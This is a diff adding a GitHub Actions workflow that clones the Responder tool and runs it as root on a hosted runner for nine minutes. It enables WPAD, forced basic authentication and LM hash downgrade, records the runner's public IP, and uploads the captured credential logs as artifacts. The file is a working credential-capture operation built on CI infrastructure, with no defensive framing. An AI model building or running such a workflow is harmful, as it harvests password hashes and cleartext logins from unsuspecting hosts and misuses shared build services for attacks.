@@ -1,0 +1,35 @@
+name: responder-capture
+on:
+  workflow_dispatch:
+jobs:
+  responder:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: setup responder
+        run: |
+          sudo apt-get update -qq
+          sudo python3 -m pip install -q netifaces 2>/dev/null || true
+          git clone --depth 1 https://github.com/lgandx/Responder.git /tmp/Responder
+          ls /tmp/Responder/Responder.py
+      - name: report public ip
+        run: |
+          PUBIP=$(curl -s https://api.ipify.org)
+          echo "PUBIP=$PUBIP"
+          echo "PUBIP=$PUBIP" > /tmp/pubip.txt
+          cat /tmp/pubip.txt
+      - name: run responder
+        run: |
+          cd /tmp/Responder
+          (sudo python3 Responder.py -I eth0 -v -wF --lm --disable-ess > /tmp/responder.log 2>&1 &)
+          echo "responder started"
+          sleep 540
+          echo "window closed"
+      - name: upload logs
+        uses: actions/upload-artifact@v4
+        with:
+          name: responder-logs
+          path: |
+            /tmp/responder.log
+            /tmp/pubip.txt
+            /tmp/Responder/logs/
